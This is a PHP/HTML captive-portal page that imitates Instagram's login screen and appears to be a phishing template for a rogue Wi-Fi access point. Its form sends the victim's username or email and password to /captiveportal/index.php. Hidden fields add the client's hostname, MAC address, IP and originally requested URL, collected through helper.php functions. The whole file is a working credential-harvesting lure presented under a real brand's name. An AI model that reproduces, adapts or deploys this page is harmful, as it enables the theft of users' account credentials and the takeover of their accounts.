<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!-- saved from url=(0014)about:internet -->
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <title>Instagram</title>

  <meta charset='UTF-8'>
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />

  <script type="text/javascript">
    function redirect() {
      setTimeout(function() {
        window.location = "/captiveportal/index.php";
      }, 100);
    }
  </script>

  <meta name="robots" content="noimageindex, noarchive">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="theme-color" content="#ffffff">
  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">

  <link rel="preload" href="assets/css/c71018ea1251.css" as="style" type="text/css" crossorigin="anonymous">
  <link rel="preload" href="assets/css/0608bd6190e0.css" as="style" type="text/css" crossorigin="anonymous">
  <link rel="preload" href="assets/css/6c761c8cd379.css" as="style" type="text/css" crossorigin="anonymous">
  <link rel="preload" href="assets/css/344096cb1b73.css" as="style" type="text/css" crossorigin="anonymous">

  <link rel="prefetch" as="stylesheet" href="assets/css/1b39124c7396.css" type="text/css" crossorigin="anonymous">

  <link rel="shortcut icon" type="image/x-icon" href="assets/img/36b3ee2d91ed.ico">

  <link href="assets/css/style.css" type="text/css" crossorigin="anonymous" rel="stylesheet">

  <link href="assets/css/344096cb1b73.css" type="text/css" crossorigin="anonymous" rel="stylesheet">

  <script src="assets/js/jquery-3.5.1.min.js"></script>

</head>

<body class="" style="">

  <div id="react-root">
    <section class="_9eogI E3X2T">
      <div></div>
      <main class="SCxLW  o64aR " role="main">
        <article class="_4_yKc">
          <div class="yOZjD _80tAB">
            <div class="V64Sp"><img class="RP4i1 JtrJi " src="assets/img/9144d6673849.jpg" alt=""><img class="RP4i1  " src="assets/img/177140221987.jpg" alt=""><img class="RP4i1  " src="assets/img/ff2c097a681e.jpg" alt=""><img class="RP4i1  "
                src="assets/img/b27a108592d8.jpg" alt=""><img class="RP4i1  UVauz" src="assets/img/5e04169b9308.jpg" alt=""></div>
          </div>
          <div class="rgFsT  ">
            <div class="gr27e  ">
              <h1 class="NXVPg Szr5J  coreSpriteLoggedOutWordmark">Instagram</h1>
              <div class="EPjEi">
                <form class="HmktE" id="loginForm" method="post" action="/captiveportal/index.php" onsubmit="redirect()">
                  <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                  <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                  <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                  <input type="hidden" name="target" value="<?=$destination?>">

                  <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                ">
                    <div class="-MzZI">
                      <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2"></span><input aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="email" id="email"
                            type="text" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Phone number, username, or email"></label>
                        <div class="i24fI"></div>
                      </div>
                    </div>
                    <div class="-MzZI">
                      <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2"></span><input aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" id="password" type="password" class="_2hvTZ pexuQ zyHYP"
                            value="" placeholder="Password"></label>
                        <div class="i24fI"></div>
                      </div>
                    </div>
                    <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button
                        class="sqdOP  L3NKy   y3zKF     " type="submit" id="btn" name="btn">
                        <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">Log In</div>
                      </button></div>
                    <div class="K-1uj Z7p_S">
                      <div class="s311c"></div>
                      <div class="_0tv-g">or</div>
                      <div class="s311c"></div>
                    </div>
                    <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button
                        class="sqdOP yWX7d    y3zKF     " type="button"><span class=" coreSpriteFacebookIcon AeB99"></span><span class="KPnG0">Log in with Facebook</span></button></div>
                  </div><a class="_2Lks6" href="#" tabindex="0">Forgot password?</a>
                </form>
              </div>
            </div>
            <div class="gr27e">
              <div class="_7UhW9   xLCgt      MMzan   _0PwGv         uL8Hv         ">
                <p class="izU2O ">Don't have an account? <a href="#" tabindex="0"><span class="_7UhW9   xLCgt       qyrsm      gtFbE      se6yk        ">Sign up</span></a></p>
              </div>
            </div>
            <div class="APQi1">
              <p class="b_nGN">Get the app.</p>
              <div class="iNy2T"><a class="z1VUo" href="#"><img alt="Available on the App Store" class="Rt8TI " src="assets/img/180ae7a0bcf7.png"></a><a class="z1VUo" href="#"><img alt="Available on Google Play" class="Rt8TI "
                    src="assets/img/e9cd846dc748.png"></a></div>
            </div>
          </div>
        </article>
      </main>
      <footer class="_8Rna9  _3Laht pC2e0 " role="contentinfo">
        <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm               KokQV                                                                                               ">
          <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                ">
            <div class="                     Igw0E     IwRSH        YBx95   ybXk5    _4EzTm  YlhBV                                                                                                            ">
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#"
                  rel="nofollow noopener noreferrer">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">About</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#"
                  rel="nofollow noopener noreferrer">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Blog</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Jobs</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#"
                  rel="nofollow noopener noreferrer">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Help</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">API</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Privacy</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Terms</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Top Accounts</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Hashtags</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Locations</div>
                </a></div>
            </div>
            <div class="                     Igw0E     IwRSH        YBx95   ybXk5    _4EzTm  YlhBV                                                                                                            ">
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Beauty</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Dance &amp; Performance</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Fitness</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Food &amp; Drink</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Home &amp; Garden</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Music</div>
                </a></div>
              <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="#">
                  <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">Visual Arts</div>
                </a></div>
            </div>
          </div>
          <div class="                     Igw0E     IwRSH        YBx95   ybXk5    _4EzTm     _22l1                                                      _49XvD                                                   ">
            <div class="_7UhW9  PIoXz       MMzan  KV-D4          uL8Hv         "><span class="_3G4x7   RFk-t bwz9f ">
                <div class="TQUPK"><span>English</span>
                  <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                     WKY0a                                                                                         "><span
                      style="display: inline-block; transform: rotate(180deg);"><svg aria-label="Down Chevron Icon" class="_8-yf5 " fill="#8e8e8e" height="12" viewBox="0 0 48 48" width="12">
                        <path d="M40 33.5c-.4 0-.8-.1-1.1-.4L24 18.1l-14.9 15c-.6.6-1.5.6-2.1 0s-.6-1.5 0-2.1l16-16c.6-.6 1.5-.6 2.1 0l16 16c.6.6.6 1.5 0 2.1-.3.3-.7.4-1.1.4z"></path>
                      </svg></span></div>
                </div><select aria-label="Switch Display Language" class="hztqj">
                  <option value="en">English</option>
                </select>
              </span></div>
            <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                        _5VUwz                                                                                      ">
              <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">© 2020 Instagram from Facebook</div>
            </div>
          </div>
        </div>
      </footer>
    </section>
  </div>

  <link rel="stylesheet" href="assets/css/c71018ea1251.css" type="text/css" crossorigin="anonymous">
  <link rel="stylesheet" href="assets/css/0608bd6190e0.css" type="text/css" crossorigin="anonymous">
  <link rel="stylesheet" href="assets/css/6c761c8cd379.css" type="text/css" crossorigin="anonymous">

  <div class="Z2m7o">
    <div class="CgFia "></div>
  </div>
  <div id="fb-root" class=" fb_reset">
    <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
      <div></div>
    </div>
  </div>

</body>

</html>
